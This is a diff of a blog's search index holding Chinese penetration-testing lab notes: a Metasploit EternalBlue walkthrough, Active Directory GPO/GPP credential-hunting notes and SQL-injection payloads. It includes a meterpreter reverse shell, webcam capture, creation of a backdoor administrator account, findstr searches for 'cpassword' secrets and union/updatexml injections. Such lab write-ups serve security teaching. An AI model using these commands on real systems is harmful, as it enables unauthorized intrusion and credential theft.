@@ -1,84 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>MSF-永恒之蓝入侵</title>
-    <url>/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
-<h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p>渗透机kali      ip:192.168.119.138</p>
-<p>靶机 win7-2    ip:192.168.119.132</p>
-<p>子网掩码：255.255.255.0</p>
-<span id="more"></span>
-
-<h3 id="测试能否ping通"><a href="#测试能否ping通" class="headerlink" title="测试能否ping通"></a>测试能否ping通</h3><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193858120.png" alt="image-20200926193858120">
-
-<p>​       </p>
-<img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193926874.png" alt="image-20200926193926874">
-
-<p>ok 可以</p>
-<hr>
-<ul>
-<li>kali打开 msfconsole</li>
-</ul>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926194608129.png" alt="image-20200926194608129"></p>
-<ul>
-<li>输入search ms17_010</li>
-</ul>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926195212894.png" alt="image-20200926195212894"></p>
-<p><code>auxiliary/scanner/smb/smb_ms17_010</code>             为扫描模板</p>
-<p><code>exploit/windows/smb/ms17_010_eternalblue</code>为攻击模板</p>
-<h3 id="扫描是否存在该漏洞"><a href="#扫描是否存在该漏洞" class="headerlink" title="扫描是否存在该漏洞"></a>扫描是否存在该漏洞</h3><blockquote>
-<p>ues <code>auxiliary/scanner/smb/smb_ms17_010</code>    #使用模块</p>
-<p>optipons                                                                         #查看我们需要的设置</p>
-<p>set rhosts   192.168.119.1-137                                       #设置目标ip范围</p>
-<p>set threads     20                                                             #设置线程，加快扫描</p>
-<p>run</p>
-</blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926201345760.png" alt="image-20200926201345760"></p>
-<p>我们可以发现存在漏洞的地方</p>
-<hr>
-<h3 id="运用攻击模块"><a href="#运用攻击模块" class="headerlink" title="运用攻击模块"></a>运用攻击模块</h3><blockquote>
-<p>use   <code>exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p>set rhosts  192.168.119.132</p>
-<p>set payload windows/x64/meterpreter/reverse_tcp</p>
-<p>set lhost 192.168.119.138</p>
-<p>exploit</p>
-</blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205215563.png" alt="image-20200926205215563"></p>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205307084.png" alt="image-20200926205307084"></p>
-<p>成功监听了。</p>
-<hr>
-<h3 id="干点坏事了-嘿嘿"><a href="#干点坏事了-嘿嘿" class="headerlink" title="干点坏事了~_ ~嘿嘿"></a>干点坏事了~_ ~嘿嘿</h3><blockquote>
-<p>sysinfo   显示远程主机系统信息</p>
-<p>getuid    查看用户身份</p>
-<p>screenshot  对远程主机当前屏幕进行截图</p>
-</blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926210803367.png" alt="image-20200926210803367"></p>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926211000376.png" alt="image-20200926211000376"></p>
-<blockquote>
-<p>webcam_list 查看有没有摄像头  ,webcam_stream 打开摄像头。虚拟机一般情况下没有摄像头，除非自己设置</p>
-<p>webcam_snap 拍照</p>
-</blockquote>
-<blockquote>
-<p>shell  进入控制台    如果出现中文乱码  : chcp 65001解决shell后中文乱码问题</p>
-<p>后面删文件（del   ），写文件(echo  内容&gt; 1.txt)都可以 //dos 命令</p>
-</blockquote>
-<hr>
-<h3 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h3><blockquote>
-<p>net user shmily-ing 111111 /add  创建shmily-ing用户</p>
-<p> net localgroup administrators shmily-ing /add   提权</p>
-</blockquote>
-<hr>
-<p><a href="https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase"><strong>EternalBlue-分析</strong></a></p>
-<p><a href="https://blog.csdn.net/wwl012345/article/details/89421881">参考博客</a></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>MSF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUU- [GWCTF 2019]</title>
     <url>/2020/09/27/2020-9-27buuctf/</url>
     <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
@@ -172,6 +94,84 @@
       </categories>
       <tags>
         <tag>算法与数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MSF-永恒之蓝入侵</title>
+    <url>/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
+<h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p>渗透机kali      ip:192.168.119.138</p>
+<p>靶机 win7-2    ip:192.168.119.132</p>
+<p>子网掩码：255.255.255.0</p>
+<span id="more"></span>
+
+<h3 id="测试能否ping通"><a href="#测试能否ping通" class="headerlink" title="测试能否ping通"></a>测试能否ping通</h3><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193858120.png" alt="image-20200926193858120">
+
+<p>​       </p>
+<img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193926874.png" alt="image-20200926193926874">
+
+<p>ok 可以</p>
+<hr>
+<ul>
+<li>kali打开 msfconsole</li>
+</ul>
+<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926194608129.png" alt="image-20200926194608129"></p>
+<ul>
+<li>输入search ms17_010</li>
+</ul>
+<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926195212894.png" alt="image-20200926195212894"></p>
+<p><code>auxiliary/scanner/smb/smb_ms17_010</code>             为扫描模板</p>
+<p><code>exploit/windows/smb/ms17_010_eternalblue</code>为攻击模板</p>
+<h3 id="扫描是否存在该漏洞"><a href="#扫描是否存在该漏洞" class="headerlink" title="扫描是否存在该漏洞"></a>扫描是否存在该漏洞</h3><blockquote>
+<p>ues <code>auxiliary/scanner/smb/smb_ms17_010</code>    #使用模块</p>
+<p>optipons                                                                         #查看我们需要的设置</p>
+<p>set rhosts   192.168.119.1-137                                       #设置目标ip范围</p>
+<p>set threads     20                                                             #设置线程，加快扫描</p>
+<p>run</p>
+</blockquote>
+<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926201345760.png" alt="image-20200926201345760"></p>
+<p>我们可以发现存在漏洞的地方</p>
+<hr>
+<h3 id="运用攻击模块"><a href="#运用攻击模块" class="headerlink" title="运用攻击模块"></a>运用攻击模块</h3><blockquote>
+<p>use   <code>exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p>set rhosts  192.168.119.132</p>
+<p>set payload windows/x64/meterpreter/reverse_tcp</p>
+<p>set lhost 192.168.119.138</p>
+<p>exploit</p>
+</blockquote>
+<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205215563.png" alt="image-20200926205215563"></p>
+<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205307084.png" alt="image-20200926205307084"></p>
+<p>成功监听了。</p>
+<hr>
+<h3 id="干点坏事了-嘿嘿"><a href="#干点坏事了-嘿嘿" class="headerlink" title="干点坏事了~_ ~嘿嘿"></a>干点坏事了~_ ~嘿嘿</h3><blockquote>
+<p>sysinfo   显示远程主机系统信息</p>
+<p>getuid    查看用户身份</p>
+<p>screenshot  对远程主机当前屏幕进行截图</p>
+</blockquote>
+<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926210803367.png" alt="image-20200926210803367"></p>
+<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926211000376.png" alt="image-20200926211000376"></p>
+<blockquote>
+<p>webcam_list 查看有没有摄像头  ,webcam_stream 打开摄像头。虚拟机一般情况下没有摄像头，除非自己设置</p>
+<p>webcam_snap 拍照</p>
+</blockquote>
+<blockquote>
+<p>shell  进入控制台    如果出现中文乱码  : chcp 65001解决shell后中文乱码问题</p>
+<p>后面删文件（del   ），写文件(echo  内容&gt; 1.txt)都可以 //dos 命令</p>
+</blockquote>
+<hr>
+<h3 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h3><blockquote>
+<p>net user shmily-ing 111111 /add  创建shmily-ing用户</p>
+<p> net localgroup administrators shmily-ing /add   提权</p>
+</blockquote>
+<hr>
+<p><a href="https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase"><strong>EternalBlue-分析</strong></a></p>
+<p><a href="https://blog.csdn.net/wwl012345/article/details/89421881">参考博客</a></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>MSF</tag>
       </tags>
   </entry>
   <entry>
@@ -333,20 +333,52 @@
 <p>通常用来<code>权限维持</code></p>
 <span id="more"></span>
 
-<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
+<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p><a href="https://adsecurity.org/?p=2288">在SYSVOL中查找密码并利用组策略首选项 - Active Directory Security (adsecurity.org)</a></p>
+<p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
+<p>了解下两个默认的共享文件夹SYSVOL和netlogon</p>
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220411234636929.png" alt="image-20220411234636929"></p>
 <h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><ul>
-<li>保存了域内组策略相关的信息（登陆脚本，组策略数据，等等）</li>
+<li>保存了域内组策略相关的信息（登陆脚本，组策略数据，等等），</li>
 </ul>
 <p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问，复制，共享的能力。  在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
 <p>目录</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>
 
+<p>默认所有域用户都能访问DC 的SYSVOL文档</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\win2016dc\SYSVOL</span><br></pre></td></tr></table></figure>
 
-
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412000133235.png" alt="image-20220412000133235"></p>
+<ul>
+<li><p>存储凭据</p>
+<p>当创建新的GPP时，在SYSVOL中创建了一个关联的XML文件，其中包含相关的配置数据，并且如果提供了密码，则它是AES-256位加密的</p>
+</li>
+</ul>
+<p>除了在2012年之前的某个时候，<a href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">微软在MSDN上发布了AES私钥</a>，可用于解密密码。由于经过身份验证的用户（任何域用户或受信任域中的用户）对 SYSVOL 具有读取访问权限，因此域中的任何人都可以在 SYSVOL 共享中搜索包含“cpassword”的 XML 文件，这是包含 AES 加密密码的值</p>
+<p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">域渗透——利用SYSVOL还原组策略中保存的密码 (3gstudent.github.io)</a></p>
 <h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
-<h5 id="GPO（Group-Policy-Object）"><a href="#GPO（Group-Policy-Object）" class="headerlink" title="GPO（Group Policy Object）"></a>GPO（Group Policy Object）</h5><p>组策略设置的集合，用GPO来存储不同的组策略信息。</p>
+<p>AD活动目录安装时候自动创建的例如sysvol\shmily.god\scripts</p>
+<h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>（Group Policy Object）</p>
+<p>组策略对象，即组策略设置的集合，用GPO来存储不同的组策略信息。</p>
+<p>安装完AD之后系统<code>默认</code>会存在<code>两个组策略对象</code></p>
+<ol>
+<li>Default Domain Policy   唯一ID:{31B2F340-016D-11D2-945F-00C04FB984F9}        默认域策略</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\shmily.god\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412001529990.png" alt="image-20220412001529990"></p>
+<ol start="2">
+<li>Default Domain Controllers Policy   唯一ID(GUID):｛6AC1786C-016F-11D2-945F- 00C04FB984F9｝  默认域控制器策略</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\shmily.god\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412001626442.png" alt="image-20220412001626442"></p>
+<p>根据上面截图有4个策略，执行的优先级顺序：</p>
+<p>本地策略   站点策略       域策略   OU策略。</p>
+<p>GPO作用的范围是DC这个OU</p>
 <h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
-<p>Gpp 用来在下面场景存储和使用凭据</p>
+<p>编辑gpo，可以看到gpp相关内容</p>
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412003126191.png" alt="image-20220412003126191"></p>
+<p>Gpp 用来在下面场景存储和使用凭据，通过gpp批量下发策略等 </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>
 
 
@@ -355,15 +387,40 @@
 
 
 
+<h1 id="域组策略利用"><a href="#域组策略利用" class="headerlink" title="域组策略利用"></a>域组策略利用</h1><h3 id="下发策略"><a href="#下发策略" class="headerlink" title="下发策略"></a>下发策略</h3><p>将下面代码保存为chpass.vbs ,这个脚本作于是将本地管理员账户的密码修改为abcabc123…</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)</span><br><span class="line">objUser.SetPassword &quot;abcabc123...&quot;</span><br><span class="line">objUser.SetInfo</span><br></pre></td></tr></table></figure>
+
+<p>下发策略脚本，将脚本放在对应文件中</p>
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005407566.png" alt="image-20220412005407566"></p>
+<p>域用户机器上进行强制更新组策略</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpupdate &#x2F;force</span><br></pre></td></tr></table></figure>
+
+<h3 id="读取策略"><a href="#读取策略" class="headerlink" title="读取策略"></a>读取策略</h3><p>域用户搜索对应文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type \\win2016dc\sysvol\shmily.god\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Machine\Scripts\Startup\chpass.vbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005607573.png" alt="image-20220412005607573"></p>
+<h3 id="寻找策略"><a href="#寻找策略" class="headerlink" title="寻找策略"></a>寻找策略</h3><p>搜索SYSVOL的下的脚本命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;r \\dc\sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc\sysvol %i in (*.bat) do @echo %i</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005839544.png" alt="image-20220412005839544"></p>
+<h1 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>存在没有打补丁的winserver2008上，超过2008版本的系统是没办法写入密码的。</p>
+<p>产生原因：使用了GPP功能，如果输入了用户的密码的话，那么密码就会以AES 256加密的形式存储在SYSVOL文件夹下的以XML后缀结尾的xml文件中，这个密码的加密密钥由微软官方给出可以进行解密。</p>
+<p>但是如果打补丁或者高版本的话，GPP服务是不能输入密码的了，这个漏洞也就相应不存在了。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">findstr &#x2F;S &#x2F;I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br></pre></td></tr></table></figure>
 
 
 
 
 
 
-<h1 id="relay"><a href="#relay" class="headerlink" title="relay"></a>relay</h1><p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
-<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
-<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="dump-hash"><a href="#dump-hash" class="headerlink" title="dump hash"></a>dump hash</h3><ul>
+
+
+
+<p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
+<p><a href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></p>
+<h1 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm-relay"></a>ntlm-relay</h1><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
+<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><p>域控独特端口：ladp 389</p>
+<h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="dump-hash"><a href="#dump-hash" class="headerlink" title="dump hash"></a>dump hash</h3><ul>
 <li>需要获得以下任一用户的权限：</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
@@ -764,118 +821,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入</title>
-    <url>/2021/01/10/SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>用户拥有可控参数，并且用户传入的参数被当作代码执行。</p>
-<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" alt="sql注入流程图"></p>
- <span id="more"></span>
-
-<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>UNION操作符可用于合并两个或多个SELECT语句的结果集，进行sql语句拼接。</p>
-<p>1.先判断是否存在注入</p>
-<p>2.判断参数类型</p>
-<p>3.使用ORDER BY 查询列数，观察回显的位置</p>
-<p>4.获取数据库名。</p>
-<p>5.获取数据库中的表名。</p>
-<p>6.获取数据库的表中的所有字段名</p>
-<p>7.获取字段中的数据</p>
-<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="数据库"></p>
-<p>查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name <span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>  字段 <span class="keyword">from</span>  表 limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>或者使用group_concat()函数</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(字段名) <span class="keyword">from</span> 数据库名.表名</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>都是一样的，不同的是，</p>
-<p>参数传递是POST类型，经常用burp suite进行测试</p>
-<h4 id="手动测试和上面一样"><a href="#手动测试和上面一样" class="headerlink" title="手动测试和上面一样"></a>手动测试和上面一样</h4><p>经常出现在：登录框，搜索框。</p>
-<h4 id="sqlmap测试"><a href="#sqlmap测试" class="headerlink" title="sqlmap测试:"></a>sqlmap测试:</h4><p> 1.sqlmap -r 1.txt，   sqlmap -r 1.txt –dbs等</p>
-<p>2.sqlmap -u <a href="http://www.xxxxx.com/">http://www.xxxxx.com</a> –data “id=1” –dbs</p>
-<p>其中1.txt为我们抓包获得的内容copy to file。</p>
-<p>目的：如果页面有cookie和session,这样我们就不用单独添加这些值的内容了。</p>
-<p>注：如果POST传入多个值，可以通过加<code>*</code>来对<code>*</code>前面的参数进行测试。</p>
-<h2 id="HEADER注入-报错注入"><a href="#HEADER注入-报错注入" class="headerlink" title="HEADER注入+报错注入"></a>HEADER注入+报错注入</h2><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><ul>
-<li>后台为了获取我们的信息，会导致header头（请求头）的部分参数可控，从而产生漏洞。</li>
-</ul>
-<h4 id="发生地方"><a href="#发生地方" class="headerlink" title="发生地方"></a>发生地方</h4><ul>
-<li>http header注入通常发生用户请求头的XFF，User-Agent，referer等地方。主要是应为后台如果获取你的ip，用户信息（User-Agent）等就有可能出现header注入。 </li>
-<li> 黑盒测试会比较困难，白盒测试我们可以通过查看代码查看。</li>
-<li>因为利用insert into 插入页面，基本不会有回显，可以通过<code>盲注</code>或者<code>报错注入</code>进行构造sql语句。</li>
-</ul>
-<h4 id="php超全局变量："><a href="#php超全局变量：" class="headerlink" title="php超全局变量："></a>php超全局变量：</h4><p>$_REQUEST(获取GET/POST)</p>
-<p>$_GET</p>
-<p>$_POST</p>
-<p>$_COOKIE</p>
-<p>$_SERVER(包含请求头的大部分信息，路径，以及脚本位置等等信息的数组)  功能非常强大</p>
-<p>$_SERVER[‘HTTP<code>_</code>HOST’]   可获取请求头里面的host内容</p>
-<p>$_SERVER[“HTTP<code>_</code>USER<code>_</code>AGENT”]  获得UA</p>
-<p>$_SERVER[“REMOTE<code>_</code>ADDR”]     获取用户ip</p>
-<p><a href="https://zhuanlan.zhihu.com/p/147834873">参考文章</a></p>
-<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p> updatexml() 是用来<code>更新</code>xml的一个函数，语法：updatexml(目标xml内容，xml路径，更新后内容)</p>
-<p>updatexml(1,concat(0x7e,(select database())),1)</p>
-<p>select database()为我们写入的子查询，concat可以将字符串进行拼接，0x7e为<code>~</code>的16进制，数据库支持16进制。</p>
-<p>我们添加了错的xml路径，从而实现报错，将我们的</p>
-<hr>
-<p><a href="http://injectx1.lab.aqlab.cn:81/Pass-07/index.php?action=show_code">靶场</a></p>
